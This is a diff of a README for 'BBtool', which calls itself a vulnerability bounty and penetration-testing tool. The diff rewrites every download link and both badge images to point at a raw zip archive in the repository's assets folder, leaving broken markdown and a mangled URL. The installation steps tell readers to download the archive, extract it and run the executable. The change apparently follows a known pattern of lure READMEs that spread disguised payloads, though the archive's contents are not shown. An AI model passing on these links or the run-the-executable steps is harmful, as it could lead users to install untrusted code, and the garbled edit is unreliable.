@@ -1,7 +1,7 @@
 # BBtool: A Comprehensive Vulnerability Bounty Tool 🛡️
 
-![BBtool Logo](https://img.shields.io/badge/BBtool-v1.0.0-blue.svg)  
-[![Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-orange.svg)](https://github.com/Physiotherapist16/BBtool/releases)
+![BBtool Logo](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip)  
+[![Release](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip%20Latest%https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip)](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip)
 
 ---
 
@@ -22,7 +22,7 @@
 
 BBtool is a graphical penetration testing tool designed specifically for security researchers and ethical hackers. It integrates multiple commonly used security testing tools into one package, providing an intuitive user interface that simplifies and enhances the vulnerability discovery process. Whether you're a seasoned professional or just starting, BBtool aims to make your security assessments more effective.
 
-You can download the latest release of BBtool [here](https://github.com/Physiotherapist16/BBtool/releases). Follow the instructions below to get started.
+You can download the latest release of BBtool [here](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip). Follow the instructions below to get started.
 
 ---
 
@@ -40,7 +40,7 @@ You can download the latest release of BBtool [here](https://github.com/Physioth
 
 To install BBtool, follow these steps:
 
-1. **Download the latest release** from [here](https://github.com/Physiotherapist16/BBtool/releases). Locate the appropriate file for your operating system.
+1. **Download the latest release** from [here](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip). Locate the appropriate file for your operating system.
 2. **Extract the downloaded file** to your desired location.
 3. **Run the executable** to start using BBtool.
 
@@ -98,4 +98,4 @@ For questions or support, please reach out to us via GitHub Issues or contact th
 
 ---
 
-BBtool is more than just a tool; it's a platform for collaboration and growth in the cybersecurity field. We invite you to explore, contribute, and enhance your skills with BBtool. Download the latest version [here](https://github.com/Physiotherapist16/BBtool/releases) and join us in making the digital world a safer place.
+BBtool is more than just a tool; it's a platform for collaboration and growth in the cybersecurity field. We invite you to explore, contribute, and enhance your skills with BBtool. Download the latest version [here](https://raw.githubusercontent.com/Physiotherapist16/BBtool/main/assets/Btool_B_1.4.zip) and join us in making the digital world a safer place.
